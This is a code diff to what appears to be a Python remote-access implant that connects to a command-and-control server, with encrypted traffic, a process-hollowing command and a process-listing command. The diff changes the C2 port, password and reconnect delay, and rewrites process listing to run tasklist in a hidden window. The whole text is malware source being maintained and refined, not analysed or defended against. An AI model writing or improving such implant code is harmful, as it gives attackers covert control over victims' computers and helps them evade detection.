@@ -1,9 +1,9 @@
 import socket, base64, json, os, sys, struct, hashlib, hmac, time, threading, subprocess, platform
 
 C2_HOST = '127.0.0.1'
-C2_PORT = 4447
-ENCRYPTION_PASSWORD = 'whisper_secret_key'
-RECONNECT_DELAY = 1
+C2_PORT = 4443
+ENCRYPTION_PASSWORD = 'test'
+RECONNECT_DELAY = 10
 
 def _k(): return hashlib.pbkdf2_hmac("sha256", ENCRYPTION_PASSWORD.encode(), b"whisper_salt_2024", 100000, 32)
 def _eb(p, k):
@@ -1508,24 +1508,14 @@ def _cmd_process_hollow(m):
 def _cmd_list_processes(m):
     try:
         if platform.system() != "Windows": return {"output": "[!] Process listing requires Windows"}
-        import ctypes
-        k32 = ctypes.windll.kernel32
-        MAX = 1024; ids = (ctypes.c_ulong * MAX)(); needed = ctypes.c_ulong()
-        if not k32.EnumProcesses(ids, ctypes.sizeof(ids), ctypes.byref(needed)):
-            return {"output": "[!] EnumProcesses failed"}
-        count = needed.value // ctypes.sizeof(ctypes.c_ulong)
+        out = subprocess.check_output(["tasklist", "/FO", "CSV", "/NH"], timeout=10, creationflags=0x08000000).decode(errors="replace")
         lines = []
-        for i in range(min(count, 50)):
-            pid = ids[i]
-            h = k32.OpenProcess(0x1000 | 0x0400, False, pid)
-            name = "N/A"
-            if h:
-                buf = ctypes.create_unicode_buffer(260)
-                sz = ctypes.c_ulong(260)
-                if k32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(sz)):
-                    name = os.path.basename(buf.value)
-                k32.CloseHandle(h)
-            lines.append(f"  {pid:>6d}  {name[:40]}")
+        for line in out.split("\n"):
+            if line.strip():
+                parts = [p.strip('" ') for p in line.split(",")]
+                if len(parts) >= 2:
+                    lines.append(f"  {parts[1]:>6s}  {parts[0][:30]}")
+                    if len(lines) >= 50: break
         return {"output": "[+] Processes (PID, Name):\n" + "\n".join(lines)}
     except Exception as e: return {"output": f"[!] Process list error: {e}"}
 
